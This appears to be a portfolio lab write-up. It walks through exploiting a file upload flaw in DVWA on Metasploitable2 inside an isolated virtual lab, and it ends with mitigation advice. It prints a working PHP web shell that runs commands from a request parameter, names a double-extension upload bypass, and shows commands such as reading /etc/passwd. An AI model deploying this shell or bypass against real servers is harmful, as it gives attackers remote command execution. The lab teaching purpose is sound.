# 🐚 Web Shell Deployment – DVWA on Metasploitable2

This project walks through the successful exploitation of a file upload vulnerability in the **Damn Vulnerable Web Application (DVWA)** hosted on **Metasploitable2**. By crafting a malicious PHP payload and bypassing weak upload validation, I was able to gain **remote command execution** in a controlled lab environment.

---

## 📌 Objective

- Identify and exploit a vulnerable file upload feature in DVWA  
- Deploy a PHP web shell and gain interactive access  
- Execute remote OS-level commands on the target system

---

## 🛠️ Lab Environment

| Role     | System                   | Notes                               |
|----------|--------------------------|--------------------------------------|
| 🧱 Target | Metasploitable 2 (DVWA) | Vulnerable web server on NAT network |
| 🧪 Attacker | Parrot OS (VirtualBox)    | Used for payload creation, testing, RCE |

**Network Setup**: Internal NAT with routing between VM instances on Oracle VirtualBox.

---

## 🧨 Vulnerability Summary

DVWA’s "Upload" module:
- Lacked file type inspection beyond extension (.jpeg/.png)
- Did not sanitize file contents (accepted embedded PHP)
- Stored files in a web-accessible path without execution restrictions

This made it vulnerable to **Remote Code Execution (RCE)** via embedded PHP in image uploads.

---

## 🧭 Exploitation Walkthrough

### 1. Upload Interface Discovery
Visited:
```
http://192.168.79.8/dvwa/vulnerabilities/upload/
```
- Confirmed image upload form was live  
- Identified weak filtering based on file extensions only

### 2. Payload Crafting
Created a simple PHP shell:

```php
<?php
// PHP code to handle command execution
if(isset($_REQUEST['cmd'])) {
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Shell</title>
</head>
<body>
    <h1>Web Shell</h1>
    <form method="get">
        <label for="cmd">Enter Command:</label>
        <input type="text" id="cmd" name="cmd">
        <input type="submit" value="Execute">
    </form>
</body>
</html>

```

Saved as `shell.php.jpeg` to bypass naive extension checks.

### 3. Upload & Execution
- Uploaded payload through DVWA interface  
- Based on my network set up at that time, I Located it at:  
  ```
  http://192.168.79.8/dvwa/hackable/uploads/shell.php.jpeg
  ```

- Appended `?cmd=whoami` → output: `www-data`

### 4. Command Execution & Proof
Executed:
- `ls`, `cat /etc/passwd`, `uname -a`, and created file `I WAS HERE`  
- Result confirmed command injection and file system access under www-data privileges

---

## ⚠️ Impact

An attacker exploiting this could:
- Browse or exfiltrate sensitive data (e.g., `/etc/passwd`)  
- Install backdoors or persistence mechanisms  
- Pivot into other internal services or escalate privileges

---

## 🔒 Mitigation Recommendations

- Enforce strict MIME type checks and file content validation  
- Store uploaded files outside the webroot  
- Disable script execution in upload directories  
- Apply a WAF and least-privilege filesystem permissions

---

## 🖼️ POC

![Payload](/assets/DVWA-Web-Shell/DVWAs.jpg)

--- 

![image](/assets/DVWA-Web-Shell/DVWAi.jpg)

---

## 📄 Full Report

📥 [Download the full DVWA Web Shell deployment report (PDF)](/DVWA-Web-Shell/DVWA-Web-Shell.pdf)

This PDF details all terminal outputs, screenshots, crafted payloads, and step-by-step execution with technical evidence.

---

> _"The easiest exploit is the one you invite — never trust file uploads."_  
> — Alvin Okiya

[![✔ BACK](https://img.shields.io/badge/BACK_TO_PORTFORLIO-Click_Here-yellow?logo=github)](/README.md)